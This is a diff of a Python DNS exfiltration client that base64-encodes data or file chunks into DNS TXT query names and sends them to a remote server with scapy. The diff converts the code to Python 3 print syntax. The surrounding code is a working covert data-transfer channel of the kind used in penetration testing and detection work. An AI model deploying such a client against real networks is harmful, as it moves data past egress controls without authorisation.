@@ -1,10 +1,10 @@
-'''
+"""
 
 This is a DNS client that transmits data within DNS TXT requests
 Thanks to Raffi for his awesome blog posts on how this can be done
 http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-out/
 
-'''
+"""
 
 import base64
 import socket
@@ -41,18 +41,18 @@ class Client:
         if helpers.validate_ip(self.remote_server):
             final_destination = self.remote_server
         else:
-            print "[*] Resolving IP of domain..."
+            print('[*] Resolving IP of domain...')
             final_destination = socket.gethostbyname(self.remote_server)
 
         # calcalate total packets
-        if ((len(data_to_transmit) % self.length) == 0):
+        if (len(data_to_transmit) % self.length) == 0:
             total_packets = len(data_to_transmit) / self.length
         else:
             total_packets = (len(data_to_transmit) / self.length) + 1
         self.current_total = total_packets
 
         # While loop over the file or data to send
-        while (byte_reader < len(data_to_transmit)):
+        while byte_reader < len(data_to_transmit):
             if not self.file_transfer:
                 try:
                     encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
@@ -60,12 +60,12 @@ class Client:
                            id=15, opcode=0, qd=[DNSQR(
                             qname=encoded_data, qtype="TXT")], aa=1, qr=0),
                          verbose=False)
-                    print "Sending data...        " + str(packet_number) + "/" + str(total_packets)
+                    print('Sending data...        ' + str(packet_number) + "/" + str(total_packets))
                     packet_number += 1
                     byte_reader += self.length
 
                 except KeyboardInterrupt:
-                    print "[*] Shutting down..."
+                    print('[*] Shutting down...')
                     sys.exit()
             else:
                 encoded_data = base64.b64encode(str(struct.pack('>I', packet_number)) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
@@ -74,7 +74,7 @@ class Client:
 
                     self.length -= 1
                     # calcalate total packets
-                    if (((len(data_to_transmit) - byte_reader) % self.length) == 0):
+                    if ((len(data_to_transmit) - byte_reader) % self.length) == 0:
                         packet_diff = (len(data_to_transmit) - byte_reader) / self.length
                     else:
                         packet_diff = ((len(data_to_transmit) - byte_reader) / self.length)
@@ -85,7 +85,7 @@ class Client:
                     self.current_total = packet_number + packet_diff
                     check_total = False
 
-                print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)
+                print('[*] Packet Number/Total Packets:        ' + str(packet_number) + "/" + str(self.current_total))
 
                 # Craft the packet with scapy
                 try:
@@ -104,7 +104,7 @@ class Client:
                         '''
 
                 except KeyboardInterrupt:
-                    print "[*] Shutting down..."
+                    print('[*] Shutting down...')
                     sys.exit()
 
             # Increment counters
